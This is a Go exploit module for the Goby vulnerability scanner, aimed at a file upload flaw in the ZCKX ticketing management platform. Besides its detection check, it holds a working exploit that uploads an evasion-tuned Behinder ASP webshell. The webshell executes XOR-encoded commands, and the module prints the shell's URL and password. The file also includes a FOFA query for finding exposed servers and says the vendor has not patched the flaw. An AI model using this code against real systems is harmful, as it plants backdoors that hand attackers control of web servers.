package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "zckx Ticketing Management Platform /SystemManager/Comm/CommFunHandler.ashx File Upload Vulnerability",
    "Description": "<p>CSCI Ticketing Management Platform is a management system designed specifically for the ticketing industry to help ticketing companies, theatres, performance venues, and other organisations to improve operational efficiency, service quality, and customer experience. An attacker can gain access to the target computer through this vulnerability to take control of the entire web server.</p>",
    "Product": "ZCKX-ticket-System",
    "Homepage": "http://www.zckx.net/SmartTicketingSystem.htm",
    "DisclosureDate": "2024-03-11",
    "PostTime": "2024-03-28",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"技术支持：北京中成科信科技发展有限公司\" && body=\"images/login/img_distri.png\"",
    "GobyQuery": "body=\"技术支持：北京中成科信科技发展有限公司\" && body=\"images/login/img_distri.png\"",
    "Level": "3",
    "Impact": "<p>An attacker can gain access to the target computer through this vulnerability to take control of the entire web server.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"http://www.zckx.net/\">http://www.zckx.net/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,custom",
            "show": ""
        },
        {
            "name": "content",
            "type": "input",
            "value": "custom",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/SystemManager/Comm/CommFunHandler.ashx",
                "follow_redirect": false,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Cookie": "ASP.NET_SessionId=zaiwm34v0gxjfsfcjx3zvw5u",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=--------------------------354575237365372692397370"
                },
                "data_type": "text",
                "data": "<%\nResponse.Write(\"checkString\")\n%>\n\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"fileName\"\n\n12.asp\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"Method\"\n\nUploadZoneImg\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"solutionNo\"\n\r\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"siteNo\"\n\n1\n----------------------------354575237365372692397370--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/UploadImage/-1--.asp",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "this is test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "中成科信票务管理平台 /SystemManager/Comm/CommFunHandler.ashx 文件上传漏洞",
            "Product": "ZCKX票务系统",
            "Description": "<p>中成科信票务管理平台是一个专门为票务行业设计的管理系统，旨在帮助票务公司、剧院、演出场馆等机构提高运营效率、提升服务质量和客户体验，攻击者可通过该漏洞取得目标计算机权限，<span style=\"color: rgb(8, 8, 8); font-size: 14px;\">进⽽控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<span style=\"color: rgb(8, 8, 8); font-size: 14px;\"><a href=\"http://www.zckx.net/\" target=\"_blank\">http://www.zckx.net/</a></span><br></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(8, 8, 8); font-size: 14px;\"></span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可通过该漏洞取得目标计算机权限，</span><span style=\"color: rgb(8, 8, 8); font-size: 14px;\">进⽽控制整个web服务器。</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "zckx Ticketing Management Platform /SystemManager/Comm/CommFunHandler.ashx File Upload Vulnerability",
            "Product": "ZCKX-ticket-System",
            "Description": "<p>CSCI Ticketing Management Platform is a management system designed specifically for the ticketing industry to help ticketing companies, theatres, performance venues, and other organisations to improve operational efficiency, service quality, and customer experience. An attacker can gain access to the target computer through this vulnerability to take control of the entire web server.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"http://www.zckx.net/\" target=\"_blank\">http://www.zckx.net/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>An attacker can gain access to the target computer through this vulnerability to take control of the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10938"
}`
	uploadFilepolitesfewr := func(hostInfo *httpclient.FixUrl, filename string, content string) (*httpclient.HttpResponse, error) {
		// 对于同名的文件只能上传一次,否则会被更改文件名，且有的系统可以上传，但对存在文件夹路径做了鉴权处理，访问需要权限,有的有防火墙，需要做免杀，故文件上传 payload 均做了免杀。POC检测的为成功上传且可以访问的
		uploadRequestConfig := httpclient.NewPostRequestConfig("/SystemManager/Comm/CommFunHandler.ashx")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")
		uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------354575237365372692397370")
		uploadRequestConfig.Header.Store("Cookie", "ASP.NET_SessionId=zaiwm34v0gxjfsfcjx3zvw5u")
		uploadRequestConfig.Data = content
		//uploadRequestConfig.Data = "------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nupload\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV--\r\n"
		if resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); resp != nil && resp.StatusCode == 200 {
			getFileConfig := httpclient.NewGetRequestConfig("/UploadImage/" + filename)
			getFileConfig.VerifyTls = false
			getFileConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, getFileConfig)
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(5)
			resp, _ := uploadFilepolitesfewr(hostInfo, "-"+filename+"--"+".asp", "<%\nResponse.Write(\"checkString\")\n%>\n\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"fileName\"\n\n12.asp\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"Method\"\n\nUploadZoneImg\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"solutionNo\"\n\r\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"siteNo\"\n\n"+filename+"\n----------------------------354575237365372692397370--")
			ss.VulURL = hostInfo.FixedHostInfo + "/SystemManager/Comm/CommFunHandler.ashx"
			return resp != nil && strings.Contains(resp.Utf8Html, "checkString")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.RandomHexString(5)
			attacktype := goutils.B2S(ss.Params["attackType"])
			//shellcontent := "<%\nResponse.CharSet = \"UTF-8\" \nk=\"e45e329feb5d925b\"\nSession(\"k\")=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\n%>"
			shellcontent := "<%Response.CharSet = \"UTF-8\" :k=\"e45e329feb5d925b\":Session(\"k\")=k:size=Request.TotalBytes:content=Request.BinaryRead(size):For i=1 To size:result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))):Next:execute(result)%>"
			content := goutils.B2S(ss.Params["content"])
			if content != "custom" {
				shellcontent = content
			}
			if resp, err := uploadFilepolitesfewr(expResult.HostInfo, "-"+filename+"--"+".asp", ""+shellcontent+"\n\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"fileName\"\n\n12.asp\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"Method\"\n\nUploadZoneImg\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"solutionNo\"\n\r\n----------------------------354575237365372692397370\nContent-Disposition: form-data; name=\"siteNo\"\n\n"+filename+"\n----------------------------354575237365372692397370--"); resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attacktype == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
					expResult.Output += "Webshell type: asp"
				}
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
